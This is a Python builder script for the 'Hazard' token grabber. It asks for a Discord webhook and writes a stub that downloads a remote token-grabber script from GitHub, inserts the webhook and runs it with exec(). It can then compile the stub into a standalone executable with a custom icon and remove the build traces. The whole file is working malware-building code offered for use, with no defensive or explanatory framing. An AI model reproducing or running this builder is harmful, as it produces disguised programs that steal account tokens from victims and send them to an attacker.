import requests
from colorama import init,Fore,Back
import os
import shutil




init()

os.system("cls")

banner = f"""
{Fore.LIGHTGREEN_EX}______________________________________________________
|                                                    |
|  ██╗  ██╗ █████╗ ███████╗ █████╗ ██████╗ ██████╗   |
|  ██║  ██║██╔══██╗╚══███╔╝██╔══██╗██╔══██╗██╔══██╗  |
|  ███████║███████║  ███╔╝ ███████║██████╔╝██║  ██║  |
|  ██╔══██║██╔══██║ ███╔╝  ██╔══██║██╔══██╗██║  ██║  |
|  ██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝  |
|  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝   |
|____________________________________________________|
|                                                    |
|              {Fore.WHITE}Created By Rdimo#6968{Fore.LIGHTGREEN_EX}                 |
|____________________________________________________|


"""

print(banner)

print(f"{Fore.YELLOW}[{Fore.WHITE}?{Fore.YELLOW}]  {Fore.RED}Webhook {Fore.YELLOW}>>{Fore.WHITE} ", end="")
webhook = input()
print(f"{Fore.YELLOW}[{Fore.WHITE}?{Fore.YELLOW}]  {Fore.RED}File Name {Fore.YELLOW}>>{Fore.WHITE} ", end="")
filename = input()


r = f'''
import requests
import os
import json
import shutil
import base64 
import psutil
import sqlite3
import zipfile
import requests
import subprocess
token_grabber = "https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py"
r = requests.get(token_grabber)
r = r.content.decode()
r = r.replace("""'webhook': "WEBHOOK_HERE" #replace WEBHOOK_HERE with your webhook""", f"""'webhook': "{webhook}" """)
exec(r)
'''

with open(f"{filename}.py", "+w") as f:
    f.write(r)
    f.close()

print(f"\n{Fore.YELLOW}[{Fore.WHITE}?{Fore.YELLOW}]  {Fore.RED}Compile? y/n {Fore.YELLOW}>>{Fore.WHITE} ", end="")
compile_or_not = input()
print("\n")

if compile_or_not == "y":
    print(f"{Fore.YELLOW}[{Fore.WHITE}?{Fore.YELLOW}]  {Fore.RED}Icon (Leave Blank For None) {Fore.YELLOW}>>{Fore.WHITE} ", end="")
    icon = input()
    
    if icon != "":
        os.system(f"""pyinstaller "{filename}.py" --onefile --icon="{icon}" """)
    else:
        os.system(f"""pyinstaller "{filename}.py" --onefile""")
        
    try:
        os.remove(f"{filename}.py")
    except Exception:
        err = 0
    try:
        shutil.rmtree("build")
    except Exception:
        err = 0
    try:
        shutil.rmtree("__pycache__")
    except Exception:
        err = 0
    try:
        os.remove(f"{filename}.spec")
    except Exception:
        err = 0 
        
os.system("cls")
print(banner)
print(f"{Fore.YELLOW}[{Fore.WHITE}!{Fore.YELLOW}]  {Fore.RED}Finished. ", end="")
input()
quit()